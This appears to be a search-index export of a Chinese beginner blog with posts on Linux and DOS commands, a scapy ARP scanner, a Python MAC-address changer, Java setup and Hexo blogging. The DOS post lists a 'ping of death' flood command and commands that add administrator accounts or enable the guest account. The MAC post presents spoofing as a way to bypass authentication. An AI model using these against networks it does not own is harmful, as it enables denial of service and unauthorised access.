.&#x2F;configure配置\n3： make编译\n4： make install 安装\n\napt-get命令   安装apt-get install xxx   #安装xxx,直接从网上下载\ndpkg -i xx   #安装xx，Debian软件包\ndpkg -l xx   #列出与xx有关软件\ndpkg -r xx   #删除\n\nuseradd命令   添加用户useradd [选项] 用户名\n-u  #指定uid标记号\n-d  #指定宿主目录\n-e  #指定账号失效时间\n-g  #指定用户的基本组名(或uid号)\n-G  #指定用户的附加组合名(或Gid号)\n-M  #不为用户建立并初始化宿主目录\n-s  #指定用户的登录shell\n\nuserdel命令    删除账号userdel -r 用户名   #表示连用户的宿主目录一并删除\n\nifconfig命令   查看网络接口信息-eth0   #以太网，局域网\n-lo    #(虚拟)回环设备\nppp0   #使用ppp协议的串口设备(通常指调制调解器)\ntr0   #令牌环(Token Ring)\nfddi0  #光纤\nifdown eth0  #禁用网络接口\nifup eth0   #启用网络接口\n\nnetstat命令   查看网络连接情况netstat [选项]\n-a  #显示所有活动连接\n-n  #以数字形式显示\n-p  #显示进程信息\n-t  #查看tcp协议相关信息\n-u  #查看udp协议相关信息\n-r  #显示路由表信息\n\nroute命令     查看路由表条目route [选项]\n-n   #查看路由表条目\nroute del default gw IP地址   #删除路由表中的默认网关记录\nroute add default gw IP地址   #像路由表添加默认网关记录\nroute add -net 网段地址&#x2F;24 gw IP地址  #添加到指定网段的路由记录\nroute del -net 网段地址&#x2F;24 gw IP地址  #删除到指定网段的路由记录\n\nseivice命令    服务命令service xx start  #启动xx服务\nservice network restart  #重启network网络服务\nservice xx stop   #关闭xx服务\n\n基本上会上面这么多就差不多了。放个链接地址方便继续学习：https://www.linuxcool.com/\n","slug":"Linux命令","date":"2021-09-26T10:03:35.000Z","categories_index":"Linux基础","tags_index":"Linux命令","author_index":"Longw"},{"id":"08b6393a58e95b9436d0c70886fad74f","title":"DOS命令","content":"\n\n常用的DOS命令身为IT人士，怎么能对windows的基本命令不知道呢？来跟我一起学习一下。\n\n来！我们win+r输入cmd进去：\n\n入门命令这黑白对比不是太好看。看一下第一条命令，教你怎么变色;\ncolor  【选项】       # 改变cmd字体颜色\n\ncolor -h   #查看帮助\n\n\n都是中文应该都看得懂的，不懂我们试试嘛：\ncolor a      #变成绿色\n\n\n我靠，兄弟你绿了!\n\n\n这下这条命令都懂了，改变颜色，选项能用 -h  查看。想变什么颜色自己选，嘿嘿嘿！！！\n上面的字有点多，看起来不是太舒服，来看一下清屏命令：\ncls     #清空前面命令页面\n\n\n可以看到鼠标不能往上拉了，说明以前的命令等已经被清空了。下面我们进入重点。\n常用的DOS命令ping命令ping   IP&#x2F;域名     #尝试能否链接此IP&#x2F;域名\n\nping baidu.com     #尝试是否能访问百度，最常用来查看网络是否接通\n\nping -t -I 65500:IP   #死亡之ping，发送大量数据包\n\nipconfig命令常用ipconfig     #帮助用户查看网络状况，如延迟、IP、主机信息、物理地址信息等\n\nipconfig&#x2F;all  #显示本机TCP&#x2F;IP配置的详细信息\n\nipconfig &#x2F;release #DHCP客户端手工释放IP地址\n\nipconfig &#x2F;renew   #DHCP客户端手工向服务器刷新请求\n\n\n不常用ipconfig &#x2F;flushdns  #清除本地DNS缓存内容\n\nipconfig &#x2F;displaydns  #显示本地DNS内容\n\nipconfig &#x2F;registerdns   #DNS客户端手工向服务器进行注册\n\nipconfig &#x2F;showclassid   #显示网络适配器的DHCP类别信息\n\nipconfig &#x2F;setclassid   #设置网络适配器的DHCP类别\n\nipconfig &#x2F;renew “Local Area Connection”  #更新“本地连接”适配器的由 DHCP 分配 IP 地址的配置\n\nipconfig &#x2F;showclassid Local*  #显示名称以 Local 开头的所有适配器的 DHCP 类别 ID\n\nipconfig &#x2F;setclassid “Local Area Connection” TEST #将“本地连接”适配器的 DHCP 类别 ID 设置为 TEST\n\n关于文件/目录的命令目录查看及跳转dir    #查看目录\npwd   #查看当前路径\ncd 目录  #切换到指定目录\nd:    #进入d盘，这个不用cd\ncd ..  #返回上级目录\ncd &#x2F; #跳转到根目录\nhelp cd  #查看cd命令详细信息\ntree    #列出路径中文件树形结构\n\n文件/目录创建及删除copy con d:123.txt   #创建123.txt文件\n立马进入输入模式：hello world\n输入完成按CTRL+z  再按回车退出输入模式\nmd 目录名    #创建目录\nrd 目录名    #删除文件夹\ndel 文件名   #删除文件\n\n文件的查看start 文件名   #按照默认打开方式打开查看，也能打开网页等，如:start www.baidu.com\ntrpe 文件名     #在命令行查看\n\n文件的移动copy 文件 移动目录    #复制文件到移动目录中\nmove 文件 移动目录   #将文件移动到相应目录中\n\n文件重命名ren 原文件名 新文件名        #重命名文件\n\n系统命令systeminfo   #查看系统信息\n\narp命令arp -a   #用于查看高速缓存中的所有项目\narp -a IP  #只显示与该接口相关的ARP缓存项目\narp -s IP 物理地址 #人工配置的物理地址将自动更新该项目\narp -d IP   #使用本命令能够人工删除一个静态项目\n\nshutdown命令shutdown -s -t 180 -c “关机”    #定时关机，并提示\nshutdown -a   #取消计划关机\n\nnet命令net view    #查看局域网内吉他计算机的名称\nnet start    #查看开启了哪些服务\nnet start 服务名   #开启服务(如：net start telent)\nnet stop 服务名   #停止服务\nnet use k:\\\\IP\\c$  #映射目标IP到本地k盘\nnet use k:\\\\IP\\c$&#x2F;del   #断开映射\nnet user 用户名 密码 &#x2F;add   #建立用户\nnet suer 用户名 &#x2F;del   #删除用户\nnet user guest&#x2F;active:yes    #激活guest用户\nnet user #查看有哪些用户\nnet user 账户名  #查看账户属性\nnet localgroup administrators 用户名 &#x2F;add   #把“用户”添加到管理员中\nnet user guest 12345 #用guest登陆后将密码改为12345\nnet password 密码  #更改系统登录密码\nnet share  #查看本地开启的共享\nnet share ipc$   #开启ipc$共享\nnet share ipc$ &#x2F;del   #删除ipc$共享\nnetstat -a   #查看端口\nnetstat -n   #查看端口的网络连接情况\nnetstat -v    #查看正在进行的工作\n\nat命令at id号   #开启已注册的某个计划任务\nat &#x2F;delete #停止所有计划任务用参数&#x2F;yes则不需确定就直接停止\nat id号 &#x2F;delete  #停止某个已注册的计划任务\nat #查看所有计划任务\nattrib 文件名(目录名) #查看某文件或目录的属性\nattrib 文件名 -A -R -S -H 或 +A +R +S +H   #去掉(添加)某文件的存档，只读，系统，隐藏属性\n\n批处理文件就是将一些DOS命令写好，并将其放到后缀为.bat的文件里。\n计划命令太多了，不写了查看这个连接就行：https://blog.csdn.net/weixin_34128237/article/details/93049391\n\n","slug":"DOS命令","date":"2021-09-26T10:03:04.000Z","categories_index":"windows基础","tags_index":"DOS命令","author_index":"Longw"},{"id":"8144d90f97aac2df03b3e52cffae8156","title":"开发网络扫描器","content":"\n\n用Python开发网络扫描器网络扫描器简介我们直接看百度的结果：\n​         迅速发展的Internet给人们的生活、工作带来了巨大的方便，但同时，也带来了一些不容忽视的问题，网络信息的安全保密问题就是其中之一。　　网络的开放性以及的是造成网络不安的主要原因。科学家在设计Internet之初就缺乏对安全性的总体构想和设计，我们所用的TCP/IP 协议是建立在可信的环境之下，首先考虑的是网络互连，它是缺乏对安全方面的考虑的。而且TCP/IP协议是完全公开的，远程访问使许多者无须到现场就能够得手，连接的主机基于互相信任的原则等等这一些性质使网络更加不安全。　　先进的技术是实现网络信息安全的有力武器，这些技术包括:密码技术、身份验证技术、访问控制技术、安全内核技术、网络反病毒技术、信息泄漏防治技术、防火墙技术、网络安全漏洞扫描技术、检测技术等。而在系统发生安全事故之前对其进行预防性检查，及时发现问题并予以解决不失为一种很好的办法，于是网络安全漏洞扫描技术应运而生。\n用Python编写网络扫描器程序话不多说，直接干，首先了解一下scapy这个库的ARP模块：\n#!&#x2F;usr&#x2F;bin&#x2F;env python\n# -*- coding: utf-8 -*-\n# @Time :2021-09-15 14:15\n# @Author : longw\n# @File : network_scanner_argparse.py\n# @Software : PyCharm\n\n\nimport scapy.all as scapy\n\ndef scan(ip): # 广播ip地址\n\tscapy.arping(ip) \n\nscan(&quot;192.168.253.2&quot;)  #路由地址\n\n\n想要知道路由地址，直接在Linux主机终端输入：\nroute -n\n\n来看下程序执行结果：\n图片1……………正在输入中。。。。。。。","slug":"开发网络扫描器","date":"2021-09-20T10:54:58.000Z","categories_index":"开发网络扫描器","tags_index":"payload","author_index":"Longw"},{"id":"f125174ab074d2773620490648712dee","title":"修改MAC地址","content":"\n\n通过Python修改Linux主机的MAC地址为什么要修改MAC地址进行渗透测试时，可以修改mac地址来绕过某些验证。。。。。。。\n\n我们先来看一下MAC地址，我们输入：\nifconfig\n\n\n这个ether后面的就是我们的MAC地址，MAC地址的长度为48位(6个字节)，通常表示为12个16进制数。\n通过ifconfig指令修改MAC地址先来看下如何通过ifconfig指令来修改MAC地址，输入：\nifconfig eth0 down    #用来关闭网络连接\nifconfig eth0 hw ether 00:11:22:33:44:44    #修改MAC地址为00:11:22:33:44:44\nifconfig eth0 up   #用来开启网络连接\n\n我这里连的是无线网，所以是修改eth0，而有些人会有一个无线接口wlan0只需将eth0修改为wlan0就行了。通过以上指令我们再次输入ifconfig就会发现MAC地址已经修改完成了：\n\n这里可能会提醒你，你的权限不够只需以root权限运行指令就行了。\n通过Python来完成修改MAC地址我们先建立一个Python文件，命名为mac_change.py。建好之后现在前面加上这两行代码：\n#!usr&#x2F;bin&#x2F;env python\n# -*- coding: utf-8 -*-\n\n第一句是告诉系统应当如何执行这个文件，第二句是添加默认编码格式。然后我们导入第一个库：\nimport subprocess\n\n这个库是用来开启一个子进程执行我们的命令。因为我们要对MAC地址进行修改，所以这个库是必要的。\n非常简单只需利用它其中一个模块：\nsubprocess.call(([&quot;ifconfig&quot;, &quot;eth0&quot;, &quot;down&quot;]))\nsubprocess.call(([&quot;ifconfig&quot;, &quot;eth0&quot;, &quot;hw&quot;, &quot;ether&quot;, &quot;00:11:22:33:44:55&quot;]))\nsubprocess.call(([&quot;ifconfig&quot;, &quot;eth0&quot;, &quot;up&quot;]))\n\n然后我们直接运行程序。成功后，再次输入ifconfig：\n\n可以看到，我们成功的利用Python程序修改了MAC地址。这是直接运行，我们也可以在终端运行：\ncd PycharmProjects&#x2F;mac_change&#x2F;     #先到达程序目录\n\npython3 mac_change.py          #运行程序\n\nifconfig                    #查看\n\n\n可以看到，成功通过终端运行程序修改MAC地址程序。\n让用户输入修改信息修改MAC地址这是我们的主要程序已经实现，但是我们想自己修改eth0和wlan0就得去修改程序。这样非常麻烦。所以我们可通过输入信息，来达到修改的目的，定义两个变量接收我们的输入：\ninterface &#x3D; input(&quot;请输入要修改的接口 &gt; &quot;)\nnew_mac &#x3D; input(&quot;请输入新的MAC地址 &gt; &quot;)\n\nsubprocess.call(([&quot;ifconfig&quot;, interface, &quot;down&quot;]))\nsubprocess.call(([&quot;ifconfig&quot;, interface, &quot;hw&quot;, &quot;ether&quot;, new_mac]))\nsubprocess.call(([&quot;ifconfig&quot;, interface, &quot;up&quot;]))\n\n再次运行：\n\n成功完成通过输入修改MAC地址。当然这样的程序并不是太好看，我们可以通过定义函数来达到功能实现的效果：\ninterface &#x3D; input(&quot;请输入要修改的接口 &gt; &quot;)\nnew_mac &#x3D; input(&quot;请输入新的MAC地址 &gt; &quot;)\n\ndef change_mac(interface,new_mac):\n    print(&quot;[+] Change MAC address for &quot; + interface + &quot; to &quot; + new_mac)\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;down&quot;]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;hw&quot;, &quot;ether&quot;, new_mac]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;up&quot;]))\n\nchange_mac(interface,new_mac)\n\n还给与了用户提示信息，再次通过终端运行它：\n\n再次成功完成。这样看起来就有点脚本的感觉了。当然我们还可以对它进行更近一步的优化，这里就不讲了，写好的代码放在下面：\n#!usr&#x2F;bin&#x2F;env python\n# -*- coding: utf-8 -*-\n\nimport subprocess\nimport optparse\nimport re\n\n\ndef change_mac(interface, new_mac):\n    print(&quot;[+] Change MAC address for &quot; + interface + &quot; to &quot; + new_mac)\n    # 这是防止用户随意输入的方法\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;down&quot;]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;hw&quot;, &quot;ether&quot;, new_mac]))\n    subprocess.call(([&quot;ifconfig&quot;, interface, &quot;up&quot;]))\n\n\ndef get_arguments():\n    # 给予用户帮助信息\n    parser &#x3D; optparse.OptionParser()\n    parser.add_option(&quot;-i&quot;, &quot;--interface&quot;, dest&#x3D;&quot;interface&quot;, help&#x3D;&quot;Interface to change its MAC address &quot;)\n    parser.add_option(&quot;-m&quot;, &quot;--mac&quot;, dest&#x3D;&quot;new_mac&quot;, help&#x3D;&quot;New MAC address &quot;)\n    (options, arguments) &#x3D; parser.parse_args()\n    if not options.interface:\n        parser.error(&quot;[-] 请指定一个interface,或者使用--help查看帮助 &quot;)\n    elif not options.new_mac:\n        parser.error(&quot;[-] 请指定一个new_mac,或者使用--help查看帮助 &quot;)\n    return options\n\n\ndef get_current_mac(interface):\n    ifconfig_result &#x3D; subprocess.check_output([&quot;ifconfig&quot;, interface])\n    mac_address_search_result &#x3D; re.search(r&quot;\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w&quot;, str(ifconfig_result))\n    # str(ifconfig_result) 这是python3\n    if mac_address_search_result:\n        return mac_address_search_result.group(0)\n    else:\n        print(&quot;[-] 无法读取MAC地址&quot;)\n\n\noptions &#x3D; get_arguments()\ncurrent_mac &#x3D; get_current_mac(options.interface)\nprint(&quot;Current MAC &#x3D; &quot;+str(current_mac))\n\nchange_mac(options.interface, options.new_mac)\n\ncurrent_mac &#x3D; get_current_mac(options.interface)\nif current_mac &#x3D;&#x3D; options.new_mac:\n    print(&quot;[+] MAC地址修改成功:&quot;+current_mac)\nelse:\n    print(&quot;MAC地址修改失败&quot;)\n\n\n","slug":"修改MAC地址","date":"2021-09-10T14:29:28.000Z","categories_index":"修改MAC地址","tags_index":"payload","author_index":"Longw"},{"id":"3c31ab40e966953ecfabe666f24c6141","title":"java安装","content":"\n\n安装Java集成环境JDK与JRE  JRE是Java的运行环境，是运行Java程序所必要的。而JDK是Java的开发环境，它里面就包含了JRE，所以我们学习Java就必须安装JDK。（这里的版本是Windows的）\nJDK安装首先，我们访问这个网址：https://www.oracle.com/cn/java/technologies/javase-downloads.html\n进去后，我们将看到如下界面：\n\n接着，我们往下翻看到Java SE 8下面有个Oracle JDK在下面有个JDK Download。我们点击它进入下面这个界面：\n\n这里讲一下，目前为止Java 8这个版本都是最流行，最稳定也是最适合我们学习的。我们往下翻看到：\n\n然后我们点击下载链接，接着会弹出同意链接，我们点击同意后继续下载。接着会弹出登录页面，有Oracle账户直接登录，没有我们就选择注册就行了。都是中文，把该填的都填上就行了。然后我们就可以下载了。等到下载好了之后，我们双击它进行安装。安装时，最开始的默认位置我们不要改：\n\n直接下一步，接着会安装JRE，同样安装到默认文件夹里，点击下一步：\n\n安装好之后，我们需要查看一下是否安装成功。win+r打开cmd，在里面输入：\njava -version\n\n出现以下页面代表安装成功了：\n\n测试Java程序现在我们还没有安装Java的程序编写工具，我们先用记事本书写第一个Java程序：\npublic class HelloWorld&#123;\n        public static void main(String[] args)&#123;\n                System.out.println(&quot;HelloWorld!&quot;);\n        &#125;\n&#125;\n\n在记事本里输入一下代码，然后我们保存为HelloIWorld.java格式的文件。接着在盘符里新建一个Javatest文件夹并将我们写好的Java文件放到这个Javatest文件夹里面。我们直接在文件夹目录地址上输入cmd，回车：\n\n进入后我们输入这行代码，将我们写好的Java文件进行编译：\njavac HelloWorld.java\n\n回车发现，显示javac不是内部命令提示。这是就需要配置环境变量了。打开我们安装Java的文件夹，打开如下路径：C:\\Program Files\\Java\\jdk1.8.0_301\\bin  我们复制这个路径。右键此电脑选择属性，在搜索框搜索环境变量，我们选择编辑账户的环境变量，我们选择中间的新建，添加变量名为JAVA_HOME,地址为：C:\\Program Files\\Java\\jdk1.8.0_301     确定。接着我们点击path，选择编辑，选择新建，输入：**%JAVA_HOME%\\bin**。接着我们保存就好。\n配置好环境变量后，我们在重新从文件夹里打开cmd，再次输入：\njavac HelloWorld.java\n\n这时我们发现没有问题。打开文件夹发现多了一个HelloWorld.class的文件，这就是Java文件的编译文件。在cmd中我们再输入：\njava HelloWorld\n\n发现成功输出：\n\n需要记住的一点是，每当我们修改.java文件里的程序内容，我们都需要对它再次进行编译，不然我们执行的永远是以前编译好的程序内容。\nEclipse的下载和安装Eclipse的下载和安装我们打开这个链接：https://www.eclipse.org/downloads/ 。打开之后，我们往下滑找到那个长方形的大的黄色按钮，我们选择下面的那个：Download Packages。接着在新页面我们选择：\n\n点击进入下载页面，然后我们点击Download进行下载。接着就是耐性等待下载完成。\n下载完成后我们将它解压到我们有空余空间的盘符里。如放到D盘的根目录，接下来我们双击运行程序\n发现需要我们选择工作区，就是Java文件的保存位置。我们可以在D盘新建一个workspace文件夹，然后将路径改到那个文件夹的位置。选择launch运行，看到欢迎页面。到此位置以及安装成功了。\n现在我们为方便以后写代码，修改一下字号：**Windows—–&gt;preferences——-&gt;General——-&gt;Appearance——–&gt;Colos and Fonts—–&gt;Basic————-&gt;Text Font————-&gt;Edit…**。选择自己想要的字体和字号就行。\n但是要注意不要选择带有@符号的，会导致中文字体倾斜。\n\n","slug":"java安装","date":"2021-09-05T10:37:40.000Z","categories_index":"Java安装","tags_index":"Java","author_index":"Longw"},{"id":"10e502baa80f2697db123aad5a708fe1","title":"关于如何建立blog","content":"\n\n关于如何建立向我这样子的博客1.首先需要搭建环境npm和node.js的安装我们直接安装nvm,用它来安装及管理node.js和npm。\n下载地址：https://github.com/coreybutler/nvm-windows/releases\n对应的系统下载对应的最新版本就行了，我是用的windows直接下载nvm-setup.zip，下载完成后直接双击运行。默认安装就行，期间修改安装路径放到你想安装的盘里。C盘够大的话放在C盘也没什么问题，我C盘内存不太大就放在D盘里面了。\n\n由于我已经安装完成就不放截图了，傻瓜式安装大家都会。\n安装完成后，win+r打开cmd输入nvm即可查看当前版本的相关信息，如图所示：\n\n接下来，我们需要安装node.js，node.js自带npm。运行命令：\nnvm install 12.14.0\n\n这里需要注意的是，安装的版本不要太高，不然等你修改主题的时候发现不匹配就糟糕了。我这里安装12.14.0版本，适配了我这个主题。\n\n安装完成后来看几条nvm的命令：\n查看node.js版本的，能看到你安装了几个node\nnvm list    \n\n使用node.js的版本\nnvm use 12.14.0\n\n卸载node.js版本\nnvm uninstall 12.14.0\n\n安装完成就可以输入使用命令了，注意如果你这里使用不了，那就是你没有将node.js添加到环境变量里。因为一般是默认就配置好了，我这边就不讲了，有问题看这边：https://www.cnblogs.com/mmit/p/12623348.html\nhexo安装接下来就是我们的神器hexo的安装了，它将自动帮助我们生成一个默认的博客框架。安装的时候就要用到我们刚才安装node.js的时候自带的npm了，打开cmd输入：\nnpm install -g cnpm --registry&#x3D;http:&#x2F;&#x2F;registry.npm.taobao.org\n\n回车安装，这里使用了淘宝的源安装cnpm，这样安装速度快一点。这里我们耐心等待安装完成就行了。安装好之后输入命令：\ncnpm install -g hexo-cli\n\n用来安装hexo，等待安装完成后就可以输入：\nhexo -v\n\n查看hexo的版本信息，出现如下界面时就表示安装成功了：\n\nGit安装现在就来安装Git，这是我们用将博客布置到github上的工具。至于其他的功能有兴趣后面可以自己摸索。安装的方法可用这个连接查看：https://blog.csdn.net/qq_39377418/article/details/95199800?ops_request_misc=%7B%22request%5Fid%22%3A%22159022752019724839242812%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=159022752019724839242812&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_v3-1-95199800.first_rank_ecpm_v1_pc_rank_v3&amp;utm_term=git%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B+windows\n下载新版本安装时，安装配置文件选项跟链接里有些不一样，实在不知道怎么办可以下载与链接里相同的版本就行了。\n2.生成hexo默认版本博客在前面安装好Git之后我们还需要对它进行配置。首先我们需要github的账号，因为我们需要在github上寄存我们的博客，以便我们在公网上对它进行访问。在注册好github账号后。我们双击Git运行它，输入这两条命令：  \nname是你的github账号     &#x65;&#x61;&#109;&#x69;&#108;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;是你的邮箱\ngit config --global user.name &quot;name&quot;\ngit config --global user.email &quot;eamil@qq.com” \n\n接下来就轻松了，我们在自己的盘符中建立一个文件夹blog用来存放我们hexo博客的默认文件。win+r进入cmd，我们将路径转到建好的文件夹blog中，输入命令：\nhexo init\n\n来初始化配置默认博客文件。如果不成功，可能是Git的环境变量没有配置好，去配置好继续输入命令就行。当出现 INFO Start blogging with Hexo！就代表你已经配置成功了。\n继续输入cmd命令：\nhexo s\n\n在本地运行博客，我们将会在localhost：4000中预览我们的博客：\n\n页面不一样很正常，我这里对主题进行了配置。反正你肯定能看到helloworld这篇文章，这是默认生成的。\n到这里，你的博客已经生成好了。接下来，就是将博客部署到github项目库里，让我们能通过链接访问。\n3.将博客部署到github上首先，我们需要用到一个插件。在cmd中输入命令：\ncnpm install hexo-deployer-git --save\n\n进行安装，安装完成后。我们要在空荡荡的github主页上建立我们的第一个项目库。他的名字叫做：\ngithubname.github.io这里的githubname是你的github的账户名。使用chrome登录到github中，在右边头像里选择Your repositories—-&gt;选择new—–&gt;在Repository name 中填写上我们的项目名字—–&gt;直接到下面带点Create repository 即可创建完成。\n其次，我们到blog文件夹中修改**_config.yml** 文件，用记事本打开即可，ctrl+f打开搜索，查找deploy：。然后我们对它进行配置。如图：\n\n你只需修改repo为你自己的GitHub项目库地址就行。可以在Your repositories—-&gt;选择建好的项目库名字进入详情页——–&gt;点击code就会出现链接地址，我们只需将它复制粘贴即可。\n最后，就是将项目部署到github库中.win+r输入cmd，转到blog路径。不会的例子如下图：\n\n进入路径后我们只需要输入命令：\nhexo d\n\n接下来输入账号密码即可，要输入两次。注意：\n你将会看到下面这句错误提示：remote: Support for password authentication was removed on August 13, 2021. 这是因为github将密码换成了token。你必须生成自己的token替换成密码才能将项目部署到github上。生成token教程如下：\n选择头像里的setting——-&gt;选择Developer setting——&gt;选择personal access token—–&gt;选择create new token。之后我们需要设置token的有效期和权限范围，这是可以用chrome自带的翻译查看选项意思，当然rope选项是一定要选择的。然后选择Generate token将会生成token，这个时候一定要将token复制保存起来，以防止后面我们刷新后找不到了。现在我们再次使用命令 hexo d 在上传时填写密码的第二次操作时将我们的token放到密码输入行里，出现Branch ‘master’ set up to track remote branch ‘master’from’https://github.com/liao545/liao545.github.io.git&#39;.的提示时，代表上传成功了。为了防止麻烦我们可以输入命令：\ngit remote set-url origin https:&#x2F;&#x2F;&lt;your_token&gt;@github.com&#x2F;&lt;USERNAME&gt;&#x2F;&lt;REPO&gt;.git\n\n其中，your_token为你自己生成的token，USERNAME为你github的账户名，REPO 为你的项目库的名字。这样就可以将仓库和token进行绑定，以避免我们重复输入token的操作。部署完成后我们就可以通过项目地址链接对我们的博客进行访问：https://GithubUsername.github.io。\n\n4.绑定域名通过上面的链接，我们可以正常访问我们的博客了。接下来就是如何通过我们自己的专属域名来访问我们的博客了。\n购买域名首先，我们要先去购买一个域名，我以华为云为例。我们注册华为云账号，进行实名认证，不认证你是无法购买域名的。全中文页面，如何购买我就不讲了。购买完成后，要进行信息模板的建立，在域名注册菜单下选择信息模板，添加默认信息模板即可。当审核完成后，我们的域名才会过户到我们的默认模板下。\n域名解析其次，我们进行域名解析，公网解析，选择管理解析，再选择快速添加解析。在出现页面中输入我们博客地址的IP地址即可。IP地址获取我们可以通过win+r输入cmd，再输入ping liao545.github.io 即可获取，完成后将出现两个新的解析条例，他们的属性都是A，我们对其头文件为www的属性修改为CNAME，并将下面地址改为自己购买的域名，如我的就是liaowblog.com。如此我们就完成了域名的解析，一般第二天就会完全生效。\n将域名与github项目绑定最后，就是将我们的域名和github项目进行绑定，以便我们通过域名访问博客。先在我们的blog文件夹中新建一个文本文档，在里面输入www.你的域名，保存后，出来将文档重命名为CNAME，注意没有后缀。然后我们在github项目详情页面点Add file —&gt;create new file—&gt;名字跟上面一样为CNAME，内容也是www.你的域名—–&gt;然后我们创建即可。当修改生效后，我们就可以通过www.你的域名来访问你的博客了。\n5.结尾大致的步骤都在上面了，不会的出错的就按照步骤名和错误提示在网上搜索一下。那我们后续如何书写博客呢？下载一个Typora或者其他的编辑器。用来对md文档进行编辑，然后我们在blog下输入cmd命令：\nhexo new post &lt;title&gt;\n\n然后，title为你的文件名，这样就会在blog—&gt;source—&gt;_post里面生成一个title.md的文件，通过下载好的编辑器对他进行修改即可，打开后里面会有一段代码，包括你的文章名和日期。写好之后，就可以通过以下几条命令上传到我们的博客中了：\nhexo clean\n\nhexo g\n\nhexo d\n\n分别是，清除缓存，生成静态文件，以及上传到github文件。再次访问我们的www.你的域名即可查看新写的博客了。\n\n","slug":"关于如何建立blog","date":"2021-08-21T13:09:42.000Z","categories_index":"博客建立","tags_index":"博客","author_index":"Longw"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2021-08-18T06:43:13.628Z","categories_index":"","tags_index":"","author_index":"Longw"}]